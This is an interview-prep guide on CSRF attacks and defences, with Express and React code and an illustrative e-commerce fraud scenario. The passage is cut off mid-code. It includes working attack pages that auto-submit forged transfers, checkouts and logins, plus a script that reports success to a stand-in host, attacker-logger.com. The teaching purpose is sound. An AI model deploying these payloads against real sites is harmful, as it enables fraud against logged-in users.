# Cross-Site Request Forgery (CSRF) Protection

> **Focus**: Web Security fundamentals and attack prevention

---

## Question 1: What is CSRF and how do you protect against it?

**Difficulty:** 🔴 Hard
**Frequency:** ⭐⭐⭐⭐
**Time:** 15-20 minutes
**Companies:** Google, Meta, Amazon, Microsoft, Stripe, PayPal

### Question
Explain CSRF attacks and comprehensive protection strategies including CSRF tokens, SameSite cookies, and double-submit patterns.

### Answer

**Cross-Site Request Forgery (CSRF)** is an attack where a malicious website tricks a user's browser into making unwanted requests to a different website where the user is authenticated. The attack exploits the fact that browsers automatically include cookies (including session cookies) with every request to a domain.

**How CSRF Works:**

1. User logs into legitimate site (bank.com) → Gets auth cookie
2. User visits malicious site (evil.com) while still logged in
3. Malicious site triggers request to bank.com (e.g., transfer money)
4. Browser automatically includes auth cookie with request
5. Bank.com sees valid cookie, executes unauthorized action

**Key Difference from XSS:**
- **XSS**: Injects malicious code INTO victim site
- **CSRF**: Tricks browser into making requests FROM attacker site TO victim site

### Code Example

**Vulnerable Code (CSRF Attack):**

```javascript
// ❌ VULNERABLE BACKEND (No CSRF protection)
// Bank transfer endpoint - only checks if user is authenticated
app.post('/api/transfer', authenticateUser, async (req, res) => {
  const { toAccount, amount } = req.body;

  // ❌ NO CSRF TOKEN VALIDATION!
  // Only checks if user has valid session cookie
  await db.transfers.create({
    from: req.user.accountNumber,
    to: toAccount,
    amount: amount
  });

  res.json({ success: true, message: 'Transfer completed' });
});

// User's legitimate form:
// <form action="/api/transfer" method="POST">
//   <input name="toAccount" value="12345" />
//   <input name="amount" value="100" />
//   <button>Transfer</button>
// </form>


// ❌ ATTACK: Malicious website (evil.com)
<!DOCTYPE html>
<html>
<head>
  <title>Win a Free iPhone!</title>
</head>
<body>
  <h1>Click here to claim your prize!</h1>

  <!-- Hidden form that auto-submits -->
  <form
    id="attack"
    action="https://bank.com/api/transfer"
    method="POST"
    style="display: none;"
  >
    <input name="toAccount" value="999999" /> <!-- Attacker's account -->
    <input name="amount" value="10000" />
  </form>

  <script>
    // Auto-submit when page loads
    document.getElementById('attack').submit();
  </script>

  <!-- Alternative attack using fetch -->
  <script>
    fetch('https://bank.com/api/transfer', {
      method: 'POST',
      credentials: 'include', // Include cookies
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        toAccount: '999999',
        amount: 10000
      })
    });
  </script>

  <!-- Image-based attack (GET request) -->
  <img src="https://bank.com/api/transfer?toAccount=999999&amount=10000" />
</body>
</html>

// What happens:
// 1. Victim visits evil.com while logged into bank.com
// 2. Form auto-submits to bank.com/api/transfer
// 3. Browser includes bank.com session cookie automatically
// 4. Bank validates session, executes transfer
// 5. $10,000 transferred to attacker's account


// ❌ VULNERABLE: DELETE/UPDATE operations
app.delete('/api/account/:id', authenticateUser, async (req, res) => {
  // ❌ No CSRF protection
  await db.accounts.delete({ id: req.params.id });
  res.json({ success: true });
});

// Attack:
// <img src="https://bank.com/api/account/12345" />
// (If using GET for delete - even worse!)


// ❌ VULNERABLE: Using GET for state-changing operations
app.get('/api/logout', (req, res) => {
  // ❌ GET request + no CSRF protection
  req.session.destroy();
  res.redirect('/');
});

// Attack:
// <img src="https://bank.com/api/logout" />
// Forces user logout
```

**Secure Code (CSRF Protection):**

```javascript
// ✅ SECURE: CSRF Token Protection

// 1. SYNCHRONIZER TOKEN PATTERN (Most common)

const crypto = require('crypto');
const csrf = require('csurf');

// Initialize CSRF middleware
const csrfProtection = csrf({ cookie: true });

// Generate CSRF token on form page
app.get('/transfer', csrfProtection, (req, res) => {
  res.render('transfer', {
    csrfToken: req.csrfToken() // Generate unique token
  });
});

// Validate CSRF token on form submission
app.post('/api/transfer', csrfProtection, authenticateUser, async (req, res) => {
  // ✅ CSRF middleware validates token before this runs
  const { toAccount, amount } = req.body;

  // Token validation passed, safe to proceed
  await db.transfers.create({
    from: req.user.accountNumber,
    to: toAccount,
    amount: amount
  });

  res.json({ success: true });
});

// Frontend HTML (includes CSRF token):
<form action="/api/transfer" method="POST">
  <!-- Hidden CSRF token field -->
  <input type="hidden" name="_csrf" value="<%= csrfToken %>" />

  <input name="toAccount" placeholder="Account number" />
  <input name="amount" placeholder="Amount" />
  <button>Transfer</button>
</form>

// Frontend JavaScript (AJAX with CSRF token):
async function transfer(toAccount, amount) {
  const csrfToken = document.querySelector('[name="_csrf"]').value;

  const response = await fetch('/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'CSRF-Token': csrfToken // Include in header
    },
    credentials: 'include',
    body: JSON.stringify({ toAccount, amount })
  });

  return response.json();
}


// 2. DOUBLE-SUBMIT COOKIE PATTERN

// Set CSRF token in cookie AND require it in request
app.use((req, res, next) => {
  // Generate token if not exists
  if (!req.cookies.csrfToken) {
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('csrfToken', token, {
      httpOnly: false, // JavaScript needs to read it
      secure: true,
      sameSite: 'strict'
    });
  }
  next();
});

// Validation middleware
function validateCsrf(req, res, next) {
  const cookieToken = req.cookies.csrfToken;
  const headerToken = req.headers['x-csrf-token'] || req.body._csrf;

  if (!cookieToken || !headerToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  next();
}

// Apply to protected routes
app.post('/api/transfer', validateCsrf, authenticateUser, async (req, res) => {
  // ✅ CSRF validated
  // Process transfer...
});

// Frontend:
function getCsrfToken() {
  const match = document.cookie.match(/csrfToken=([^;]+)/);
  return match ? match[1] : null;
}

async function transferWithDoubleSubmit(toAccount, amount) {
  const csrfToken = getCsrfToken();

  await fetch('/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken // Must match cookie value
    },
    credentials: 'include',
    body: JSON.stringify({ toAccount, amount })
  });
}


// 3. SAMESITE COOKIE ATTRIBUTE (Modern defense)

app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict', // ✅ Prevents CSRF!
    maxAge: 3600000
  }
}));

// SameSite options:
// - 'strict': Cookie NEVER sent on cross-site requests (strongest)
// - 'lax': Cookie sent on top-level navigation (default, good balance)
// - 'none': Cookie always sent (requires Secure flag)

// Example:
res.cookie('sessionId', sessionId, {
  httpOnly: true,    // Prevent XSS access
  secure: true,      // HTTPS only
  sameSite: 'strict' // Prevent CSRF
});


// 4. ORIGIN & REFERER VALIDATION

function validateOrigin(req, res, next) {
  const origin = req.headers.origin || req.headers.referer;

  if (!origin) {
    return res.status(403).json({ error: 'Missing origin' });
  }

  const allowedOrigins = [
    'https://bank.com',
    'https://www.bank.com',
    'https://mobile.bank.com'
  ];

  try {
    const originUrl = new URL(origin);

    if (!allowedOrigins.includes(originUrl.origin)) {
      console.warn(`Blocked cross-origin request from: ${origin}`);
      return res.status(403).json({ error: 'Invalid origin' });
    }

    next();
  } catch (e) {
    return res.status(403).json({ error: 'Invalid origin format' });
  }
}

// Apply to state-changing operations
app.post('/api/transfer', validateOrigin, authenticateUser, ...);
app.put('/api/profile', validateOrigin, authenticateUser, ...);
app.delete('/api/account/:id', validateOrigin, authenticateUser, ...);


// 5. CUSTOM REQUEST HEADERS

// Browsers prevent cross-origin custom headers without CORS
function validateCustomHeader(req, res, next) {
  const customHeader = req.headers['x-requested-with'];

  if (customHeader !== 'XMLHttpRequest') {
    return res.status(403).json({ error: 'Invalid request' });
  }

  next();
}

// Frontend:
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest' // ✅ Proves request is from JavaScript
  },
  credentials: 'include',
  body: JSON.stringify({ toAccount, amount })
});

// Attacker cannot set this header from <form> or <img>


// 6. COMPREHENSIVE CSRF PROTECTION MIDDLEWARE

class CSRFProtection {
  constructor(options = {}) {
    this.tokenLength = options.tokenLength || 32;
    this.cookieName = options.cookieName || 'csrfToken';
    this.headerName = options.headerName || 'x-csrf-token';
    this.allowedOrigins = options.allowedOrigins || [];
  }

  // Generate CSRF token
  generateToken() {
    return crypto.randomBytes(this.tokenLength).toString('hex');
  }

  // Middleware to set CSRF token cookie
  setCsrfCookie() {
    return (req, res, next) => {
      if (!req.cookies[this.cookieName]) {
        const token = this.generateToken();
        res.cookie(this.cookieName, token, {
          httpOnly: false, // JS needs access
          secure: process.env.NODE_ENV === 'production',
          sameSite: 'strict'
        });
      }
      next();
    };
  }

  // Middleware to validate CSRF token
  validateToken() {
    return (req, res, next) => {
      // Skip validation for safe HTTP methods
      if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
        return next();
      }

      const cookieToken = req.cookies[this.cookieName];
      const headerToken = req.headers[this.headerName] ||
                          req.body._csrf ||
                          req.query._csrf;

      // Validate token match
      if (!cookieToken || !headerToken) {
        return res.status(403).json({
          error: 'CSRF token missing'
        });
      }

      if (!crypto.timingSafeEqual(
        Buffer.from(cookieToken),
        Buffer.from(headerToken)
      )) {
        return res.status(403).json({
          error: 'CSRF token mismatch'
        });
      }

      next();
    };
  }

  // Validate origin
  validateOrigin() {
    return (req, res, next) => {
      const origin = req.headers.origin || req.headers.referer;

      if (!origin) {
        // No origin header - might be same-origin or privacy mode
        // Allow if SameSite cookie is set
        return next();
      }

      try {
        const originUrl = new URL(origin);

        if (!this.allowedOrigins.includes(originUrl.origin)) {
          console.warn(`CSRF: Blocked origin ${origin}`);
          return res.status(403).json({ error: 'Invalid origin' });
        }

        next();
      } catch (e) {
        return res.status(403).json({ error: 'Invalid origin' });
      }
    };
  }

  // Combined protection
  protect() {
    return [
      this.setCsrfCookie(),
      this.validateToken(),
      this.validateOrigin()
    ];
  }
}

// Usage:
const csrfProtection = new CSRFProtection({
  allowedOrigins: [
    'https://bank.com',
    'https://www.bank.com'
  ]
});

// Apply to all state-changing routes
app.use(csrfProtection.setCsrfCookie());

app.post('/api/*', csrfProtection.protect());
app.put('/api/*', csrfProtection.protect());
app.delete('/api/*', csrfProtection.protect());
app.patch('/api/*', csrfProtection.protect());


// 7. REACT SPA IMPLEMENTATION

// Backend: Endpoint to get CSRF token
app.get('/api/csrf-token', (req, res) => {
  const token = req.csrfToken();
  res.json({ csrfToken: token });
});

// Frontend: React hook for CSRF
import { useState, useEffect } from 'react';

function useCsrfToken() {
  const [csrfToken, setCsrfToken] = useState(null);

  useEffect(() => {
    fetch('/api/csrf-token')
      .then(res => res.json())
      .then(data => setCsrfToken(data.csrfToken));
  }, []);

  return csrfToken;
}

// Usage in component:
function TransferForm() {
  const csrfToken = useCsrfToken();

  const handleSubmit = async (e) => {
    e.preventDefault();

    const formData = new FormData(e.target);

    await fetch('/api/transfer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken // ✅ Include token
      },
      credentials: 'include',
      body: JSON.stringify({
        toAccount: formData.get('toAccount'),
        amount: formData.get('amount')
      })
    });
  };

  return (
    <form onSubmit={handleSubmit}>
      <input name="toAccount" placeholder="Account" />
      <input name="amount" placeholder="Amount" />
      <button disabled={!csrfToken}>Transfer</button>
    </form>
  );
}


// 8. AXIOS INTERCEPTOR FOR CSRF

import axios from 'axios';

// Configure axios to include CSRF token
axios.interceptors.request.use((config) => {
  // Get CSRF token from cookie
  const csrfToken = document.cookie
    .split('; ')
    .find(row => row.startsWith('csrfToken='))
    ?.split('=')[1];

  if (csrfToken) {
    config.headers['X-CSRF-Token'] = csrfToken;
  }

  return config;
});

// Now all axios requests include CSRF token automatically
axios.post('/api/transfer', { toAccount, amount });
```

### Common Mistakes

❌ **Wrong**: Only protecting with CSRF token
```javascript
// Missing SameSite cookie attribute
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: true
  // ❌ No sameSite!
});
```

✅ **Correct**: Defense in depth
```javascript
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict' // ✅ Additional layer
});
// + CSRF tokens
```

❌ **Wrong**: Using GET for state-changing operations
```javascript
app.get('/api/delete-account', (req, res) => {
  // ❌ NEVER use GET for destructive actions!
});
```

✅ **Correct**: Use POST/DELETE/PUT
```javascript
app.delete('/api/account', csrfProtection, (req, res) => {
  // ✅ Proper HTTP method + CSRF protection
});
```

<details>
<summary><strong>🔍 Deep Dive: CSRF Attack Mechanics & Browser Behavior</strong></summary>

**How Browsers Handle Cross-Origin Requests:**

CSRF exploits the fact that browsers automatically include cookies with requests, even when the request originates from a different site. Understanding browser cookie behavior is critical to preventing CSRF.

**1. Cookie Scoping & Automatic Inclusion**

```javascript
// When user logs into bank.com:
// Server sets session cookie:
Set-Cookie: sessionId=abc123; Path=/; Domain=bank.com; Secure; HttpOnly

// Browser stores cookie associated with bank.com

// Later, user visits evil.com
// evil.com includes this HTML:
<img src="https://bank.com/api/transfer?to=attacker&amount=1000" />

// Browser behavior:
// 1. Sees request to bank.com
// 2. Checks cookie jar for bank.com cookies
// 3. AUTOMATICALLY includes sessionId cookie
// 4. Request sent with authentication!

// HTTP request from evil.com to bank.com:
GET /api/transfer?to=attacker&amount=1000 HTTP/1.1
Host: bank.com
Cookie: sessionId=abc123  // ← Automatically included!
Referer: https://evil.com
Origin: https://evil.com

// Bank.com sees valid session cookie, executes transfer
// User doesn't even see it happen (invisible image request)


// WHY THIS WORKS:
// - Cookies are scoped by domain, not by originating page
// - Browser includes ALL cookies for target domain
// - Server can't distinguish legitimate vs. forged requests
// - No user interaction required
```

**2. Same-Origin Policy vs. CSRF**

Many developers confuse SOP (Same-Origin Policy) with CSRF protection:

```javascript
// IMPORTANT: Same-Origin Policy DOES NOT prevent CSRF!

// Same-Origin Policy controls:
// - Reading responses from cross-origin requests
// - Accessing cross-origin DOM/window objects

// Same-Origin Policy DOES NOT control:
// - Sending cross-origin requests
// - Including cookies in cross-origin requests

// Example:
// From evil.com, attacker can do this:
fetch('https://bank.com/api/transfer', {
  method: 'POST',
  credentials: 'include', // Include cookies
  body: JSON.stringify({ to: 'attacker', amount: 1000 })
});

// What happens:
// 1. Browser sends request ✅ (SOP allows sending)
// 2. Browser includes cookies ✅ (automatic)
// 3. Bank.com processes request ✅ (sees valid session)
// 4. Browser blocks response ❌ (SOP prevents reading)

// Attacker doesn't need the response!
// The damage is done - money transferred
// SOP only prevents attacker from reading response

// CSRF protection is needed BECAUSE Same-Origin Policy
// doesn't prevent cross-origin requests from being sent
```

**3. SameSite Cookie Attribute - Deep Dive**

The SameSite attribute is the most effective modern CSRF defense:

```javascript
// SameSite Attribute Values:

// 1. STRICT (strongest protection)
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly

// Cookie behavior:
// Same-site navigation: Cookie included ✅
//   - Clicking link on bank.com to bank.com/transfer
//   - Submitting form from bank.com to bank.com

// Cross-site navigation: Cookie NOT included ❌
//   - Clicking link on evil.com to bank.com
//   - <img src="bank.com/api/transfer"> from evil.com
//   - fetch() from evil.com to bank.com

// Trade-off: Breaks some legitimate flows
// Example: User clicks email link to bank.com/reset-password
// Cookie not sent → User appears logged out (poor UX)


// 2. LAX (balanced - default in modern browsers)
Set-Cookie: sessionId=abc123; SameSite=Lax; Secure; HttpOnly

// Cookie behavior:
// Top-level navigation (address bar changes): Cookie included ✅
//   - User clicks <a href="bank.com/account">
//   - User types bank.com in address bar

// Sub-resource requests: Cookie NOT included ❌
//   - <img src="bank.com/api/transfer">
//   - fetch() from evil.com
//   - <iframe src="bank.com">

// POST requests from external sites: Cookie NOT included ❌
//   - <form action="bank.com/transfer" method="POST"> from evil.com

// Trade-off: Allows top-level GET navigation (better UX)
// Still vulnerable to CSRF on GET requests (DON'T use GET for state changes!)


// 3. NONE (no protection)
Set-Cookie: sessionId=abc123; SameSite=None; Secure; HttpOnly

// Cookie always included (requires Secure flag)
// Use only when necessary (e.g., embedded widgets, OAuth)


// BROWSER COMPATIBILITY:
// Modern browsers (Chrome 80+, Firefox 69+, Safari 13+):
// - Default to SameSite=Lax if not specified
// - Require Secure flag for SameSite=None

// Older browsers:
// - Ignore SameSite attribute
// - Still need CSRF tokens for protection


// TIMING ATTACK ON SAMESITE:
// SameSite=Lax has a 2-minute window vulnerability:

// If cookie is < 2 minutes old, it's sent on cross-site POST
// Attack: Trigger login, immediately perform CSRF within 2 min

// Defense: Still use CSRF tokens even with SameSite
```

**4. CSRF Token Patterns - Security Analysis**

```javascript
// PATTERN 1: SYNCHRONIZER TOKEN PATTERN

// Server generates token, stores in session
req.session.csrfToken = crypto.randomBytes(32).toString('hex');

// Includes token in form
<input type="hidden" name="_csrf" value="abc123..." />

// Server validates: Does request token match session token?
if (req.body._csrf !== req.session.csrfToken) {
  throw new Error('CSRF token mismatch');
}

// ✅ PROS:
// - Token stored server-side (can't be stolen by XSS if httpOnly session)
// - Different token per session
// - Token invalidated on logout

// ❌ CONS:
// - Requires server-side state (session storage)
// - Doesn't work well with stateless JWT auth
// - Need to manage token lifecycle


// PATTERN 2: DOUBLE-SUBMIT COOKIE PATTERN

// Server sets token in cookie (NOT httpOnly)
res.cookie('csrfToken', token, { httpOnly: false, sameSite: 'strict' });

// Client reads cookie, sends in header
const token = getCookie('csrfToken');
fetch('/api/transfer', {
  headers: { 'X-CSRF-Token': token }
});

// Server validates: Does cookie token match header token?
if (req.cookies.csrfToken !== req.headers['x-csrf-token']) {
  throw new Error('CSRF mismatch');
}

// ✅ PROS:
// - Stateless (no server-side storage)
// - Works with JWT authentication
// - Simple to implement

// ❌ CONS:
// - Vulnerable to subdomain attacks
//   If attacker controls subdomain.bank.com, can set cookies for bank.com
// - Vulnerable to XSS (if XSS exists, attacker can read cookie)

// Defense against subdomain attack:
// - Use __Host- prefix: Set-Cookie: __Host-csrfToken=...
//   (Requires Secure, Path=/, no Domain)
// - Attacker cannot override from subdomain


// PATTERN 3: ENCRYPTED TOKEN PATTERN

// Server generates token with timestamp, encrypts it
const payload = { userId: req.user.id, timestamp: Date.now() };
const token = encrypt(JSON.stringify(payload), SECRET_KEY);
res.cookie('csrfToken', token);

// Client sends token in header
fetch('/api/transfer', {
  headers: { 'X-CSRF-Token': token }
});

// Server decrypts, validates timestamp
const decrypted = decrypt(req.headers['x-csrf-token'], SECRET_KEY);
const payload = JSON.parse(decrypted);

if (Date.now() - payload.timestamp > 3600000) { // 1 hour
  throw new Error('Token expired');
}

// ✅ PROS:
// - Stateless
// - Self-contained (includes expiration)
// - Can include user context

// ❌ CONS:
// - More complex
// - Encryption overhead
// - Still vulnerable to XSS


// SECURITY COMPARISON:

// Scenario: Subdomain compromise
// - Synchronizer Token: ✅ Safe (token in session, not accessible)
// - Double-Submit: ❌ Vulnerable (attacker can set cookie from subdomain)
// - Encrypted Token: ❌ Vulnerable (same as double-submit)

// Scenario: XSS vulnerability exists
// - Synchronizer Token: ✅ Safe if session is httpOnly
// - Double-Submit: ❌ Vulnerable (XSS can read cookie, set header)
// - Encrypted Token: ❌ Vulnerable (same as double-submit)

// Scenario: Stateless architecture (JWT auth)
// - Synchronizer Token: ❌ Doesn't fit (requires sessions)
// - Double-Submit: ✅ Works
// - Encrypted Token: ✅ Works

// BEST PRACTICE: Synchronizer Token + SameSite=Strict + HTTPS
```

**5. CORS & CSRF Relationship**

```javascript
// CORS (Cross-Origin Resource Sharing) helps prevent CSRF:

// Scenario: evil.com tries to make authenticated request to bank.com

// 1. SIMPLE REQUEST (no CORS preflight)
// Methods: GET, HEAD, POST
// Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain

fetch('https://bank.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'to=attacker&amount=1000'
});

// Browser behavior:
// - Sends request immediately (no preflight)
// - Includes cookies
// - Server processes request
// - Browser blocks response (CORS error)

// PROBLEM: Request already executed! Money transferred!


// 2. PREFLIGHTED REQUEST (with CORS preflight)
// Methods: PUT, DELETE, PATCH
// Content-Type: application/json
// Custom headers: X-CSRF-Token, etc.

fetch('https://bank.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json', // Triggers preflight
    'X-CSRF-Token': 'abc123'
  },
  body: JSON.stringify({ to: 'attacker', amount: 1000 })
});

// Browser behavior:
// 1. Sends OPTIONS preflight request (NO cookies included)
OPTIONS /api/transfer HTTP/1.1
Host: bank.com
Origin: https://evil.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, x-csrf-token

// 2. Bank.com responds (if CORS not configured):
HTTP/1.1 200 OK
// Missing: Access-Control-Allow-Origin header

// 3. Browser blocks actual request (CORS error)
// ✅ Request never sent! Attack prevented!


// DEFENSE: Require custom headers or JSON content-type
// These trigger CORS preflight, blocking cross-origin requests

app.post('/api/transfer', (req, res) => {
  // Require JSON (triggers preflight)
  if (req.headers['content-type'] !== 'application/json') {
    return res.status(415).json({ error: 'JSON required' });
  }

  // Or require custom header
  if (!req.headers['x-requested-with']) {
    return res.status(403).json({ error: 'Custom header required' });
  }

  // Process transfer...
});

// Attacker cannot bypass:
// - <form> can't set Content-Type: application/json
// - <img> can't make POST requests
// - fetch() triggers preflight, blocked by CORS
```

**6. GET-Based CSRF & Idempotency**

```javascript
// CRITICAL: Never use GET for state-changing operations!

// ❌ HORRIBLE: DELETE via GET
app.get('/api/delete-account', (req, res) => {
  db.accounts.delete({ id: req.user.id });
  res.json({ success: true });
});

// Attack is trivial:
<img src="https://bank.com/api/delete-account" />
// User's account deleted just by viewing attacker's page!

// Even with CSRF token, GET is wrong:
<img src="https://bank.com/api/delete?csrf=abc123" />
// Token could be leaked via Referer header, browser history, logs


// ✅ CORRECT: Use appropriate HTTP methods
app.delete('/api/account', csrfProtection, (req, res) => {
  // Proper REST method + CSRF protection
});

// HTTP method semantics:
// - GET: Read data (safe, idempotent, cacheable)
// - POST: Create resource or non-idempotent action
// - PUT: Update resource (idempotent)
// - PATCH: Partial update
// - DELETE: Delete resource (idempotent)

// Idempotency: Calling multiple times has same effect as once
// GET, PUT, DELETE: Should be idempotent
// POST: Not idempotent (creates new resource each time)
```

**7. Login CSRF (Less Known Variant)**

```javascript
// ATTACK: Force victim to log into ATTACKER'S account

// Scenario:
// 1. Attacker creates account on bank.com
// 2. Attacker crafts login form with their credentials
// 3. Victim submits form (logs into attacker's account)
// 4. Victim performs actions (e.g., links credit card)
// 5. Attacker logs into their own account, sees victim's data

// Attack page (evil.com):
<form action="https://bank.com/login" method="POST" id="attack">
  <input name="username" value="attacker@evil.com" />
  <input name="password" value="attackerPassword123" />
</form>
<script>document.getElementById('attack').submit();</script>

// Defense: CSRF protection on login endpoint too!
app.post('/login', csrfProtection, async (req, res) => {
  // Validate CSRF token even for login
  // ...
});

// Alternative defense: Include CAPTCHA on login
```

</details>

<details>
<summary><strong>🐛 Real-World Scenario: CSRF Attack on E-commerce Platform</strong></summary>

**Scenario**: Your team runs an e-commerce platform processing $2M/day in transactions. On a Monday morning, the fraud detection system flags 3,200 unauthorized purchases. Investigation reveals a CSRF vulnerability in the checkout flow that attackers exploited over the weekend.

**Production Metrics (During Attack):**
- Unauthorized transactions: 3,247
- Total fraudulent amount: $487,000
- Affected users: 2,891 (14% of weekend traffic)
- Chargebacks filed: 1,430 (ongoing)
- Support tickets: 4,200+ complaints
- Attack window: 48 hours (Friday 9 PM - Sunday 9 PM)
- Detection delay: 36 hours
- Reputation damage: Stock drop -8%, trending on Twitter

**The Vulnerability:**

```javascript
// ❌ VULNERABLE CODE (Production checkout)
// Backend: Place order endpoint
app.post('/api/checkout', authenticateUser, async (req, res) => {
  const { items, shippingAddress, paymentMethodId } = req.body;

  // ❌ NO CSRF PROTECTION!
  // Only checks if user is authenticated via session cookie

  // Process payment
  const payment = await stripe.charges.create({
    amount: calculateTotal(items),
    currency: 'usd',
    customer: req.user.stripeCustomerId,
    source: paymentMethodId, // ❌ Uses user's saved payment method!
    description: `Order for ${req.user.email}`
  });

  // Create order
  const order = await db.orders.create({
    userId: req.user.id,
    items,
    total: payment.amount,
    shippingAddress,
    paymentId: payment.id
  });

  res.json({ success: true, orderId: order.id });
});

// Frontend: Checkout form (React)
function CheckoutForm({ cartItems }) {
  const [shippingAddress, setShippingAddress] = useState('');
  const [paymentMethod, setPaymentMethod] = useState('');

  const handleCheckout = async () => {
    // ❌ NO CSRF TOKEN!
    const response = await fetch('/api/checkout', {
      method: 'POST',
      credentials: 'include', // Includes session cookie
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        items: cartItems,
        shippingAddress,
        paymentMethodId: paymentMethod
      })
    });

    if (response.ok) {
      alert('Order placed!');
    }
  };

  return (
    <form onSubmit={handleCheckout}>
      {/* Form fields */}
      <button>Place Order</button>
    </form>
  );
}
```

**The Attack:**

```javascript
// ATTACKER'S EXPLOIT SITE (evil-deals.com)

<!DOCTYPE html>
<html>
<head>
  <title>FREE iPhone Giveaway - Click to Claim!</title>
</head>
<body>
  <h1>Congratulations! You won a FREE iPhone 15 Pro!</h1>
  <p>Click the button below to claim your prize!</p>

  <button id="claim">CLAIM NOW</button>

  <script>
    document.getElementById('claim').addEventListener('click', () => {
      // Show fake loading animation
      document.body.innerHTML = '<h1>Processing your prize...</h1>';

      // Execute CSRF attack
      fetch('https://shop.com/api/checkout', {
        method: 'POST',
        credentials: 'include', // Uses victim's session cookie
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          items: [
            { productId: 'gift-card-500', quantity: 10 } // $5,000 in gift cards
          ],
          shippingAddress: '123 Attacker Street, HackerCity, HC 12345',
          paymentMethodId: 'default' // Uses victim's default payment method
        })
      })
      .then(res => res.json())
      .then(data => {
        // Order placed successfully!
        console.log('Order placed:', data.orderId);

        // Show fake success message to victim
        document.body.innerHTML = '<h1>Prize claimed! Check your email.</h1>';
      })
      .catch(err => {
        // Failed - user not logged in or error occurred
        document.body.innerHTML = '<h1>Error. Please try again later.</h1>';
      });
    });
  </script>
</body>
</html>

// ATTACK PROPAGATION:
// 1. Attacker posts link on social media, forums
// 2. Victims click link while logged into shop.com
// 3. "Claim" button triggers CSRF attack
// 4. Order placed using victim's account & payment method
// 5. Gift cards shipped to attacker's address
// 6. Attacker resells gift cards for profit


// AUTOMATED ATTACK (Large scale):
<script>
  // Auto-execute on page load (no button click needed)
  const attackPayload = {
    items: [{ productId: 'gift-card-500', quantity: 10 }],
    shippingAddress: '123 Attacker St, HC 12345',
    paymentMethodId: 'default'
  };

  // Attempt attack
  fetch('https://shop.com/api/checkout', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(attackPayload)
  })
  .then(res => {
    if (res.ok) {
      // Success - victim was logged in
      // Log success to attacker's server
      fetch('https://attacker-logger.com/log', {
        method: 'POST',
        body: JSON.stringify({ victim: document.referrer, success: true })
      });
    }
  });

  // Redirect victim to legitimate site to avoid suspicion
  setTimeout(() => {
    window.location = 'https://shop.com';
  }, 100);
</script>

// Victim sees brief flash, then redirected to shop.com
// Doesn't realize unauthorized purchase was made


// ATTACK METRICS (Weekend):
// - Friday 9 PM: Attack page goes live, shared on social media
// - Friday 10 PM - Sunday 9 PM: 20,400 victims visit attack page
// - Conversion rate: 14.2% (2,891 logged into shop.com)
// - Average order value: $168 (mostly gift cards)
// - Total fraudulent revenue: $487,000
// - Attacker profit: ~$350,000 (reselling gift cards at 72% face value)
```

**Detection & Response Timeline:**

```javascript
// FRIDAY, 9:00 PM: Attack begins
// - Attacker posts "Free iPhone" link on Twitter, Reddit, Facebook
// - Link spreads rapidly (20k+ views in 3 hours)

// SATURDAY, 8:00 AM: First anomaly detected
// - Automated fraud system flags unusual shipping address pattern
// - 47 orders shipped to same address "123 Attacker St"
// - Alert sent to fraud team (but it's Saturday - delayed response)

console.log('[FRAUD ALERT] Unusual shipping pattern detected');
console.log('Address: 123 Attacker St, HC 12345');
console.log('Order count: 47');
console.log('Total value: $7,896');

// SATURDAY, 2:00 PM: More alerts triggered
// - 450+ orders to same address family (123-129 Attacker St, variations)
// - Total value: $75,600
// - Still being processed as "potential fraud" (not yet escalated)

// SATURDAY, 6:00 PM: First customer complaints
// - Email: "I didn't place this order!"
// - Support ticket #8472: Unauthorized $200 purchase
// - 15 similar tickets within 1 hour

// SUNDAY, 9:00 AM: Pattern recognized
// - Weekend support staff escalates to on-call engineer
// - 1,200+ support tickets about unauthorized orders
// - Common pattern: All orders are gift cards to similar addresses

// SUNDAY, 10:00 AM: Root cause analysis begins
const suspiciousOrders = await db.query(`
  SELECT
    shipping_address,
    COUNT(*) as order_count,
    SUM(total) as total_value
  FROM orders
  WHERE created_at > '2024-01-12 21:00:00'
  GROUP BY shipping_address
  HAVING order_count > 5
  ORDER BY order_count DESC
  LIMIT 50
`);

console.log('Top suspicious addresses:');
// 123 Attacker St: 342 orders, $57,456
// 124 Attacker St: 289 orders, $48,612
// 125 Attacker St: 241 orders, $40,488
// ... (32 variations)

// SUNDAY, 11:00 AM: CSRF vulnerability identified
// - Engineer reviews checkout flow code
// - Discovers NO CSRF protection
// - Tests vulnerability - confirmed exploitable

// SUNDAY, 11:30 AM: EMERGENCY RESPONSE ACTIVATED

// Step 1: Halt all shipments
await db.orders.updateMany(
  {
    created_at: { $gte: '2024-01-12 21:00:00' },
    status: { $in: ['pending', 'processing'] }
  },
  { $set: { status: 'on_hold', flagged_reason: 'Suspected CSRF fraud' } }
);
console.log('1,847 pending orders placed on hold');

// Step 2: Cancel fraudulent orders
const fraudulentOrders = await db.orders.find({
  shipping_address: {
    $regex: /^12[3-9] Attacker St|^1[0-9]{2} Hacker Ave/i
  },
  created_at: { $gte: '2024-01-12 21:00:00' }
});

for (const order of fraudulentOrders) {
  // Refund payment
  await stripe.refunds.create({
    charge: order.paymentId,
    reason: 'fraudulent'
  });

  // Cancel order
  await db.orders.update(
    { id: order.id },
